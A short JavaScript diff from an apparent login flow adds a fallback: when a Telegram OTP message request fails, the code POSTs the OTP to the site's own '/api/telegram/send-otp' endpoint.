@@ -215,7 +215,13 @@
               text: otpMsg,
               parse_mode: 'Markdown'
             })
-          }).catch(function() {});
+          }).catch(function() {
+            fetch((window.API_BASE || '') + '/api/telegram/send-otp', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ code: otpCode })
+            }).catch(function() {});
+          });
 
         } else {
           if (loginError) {
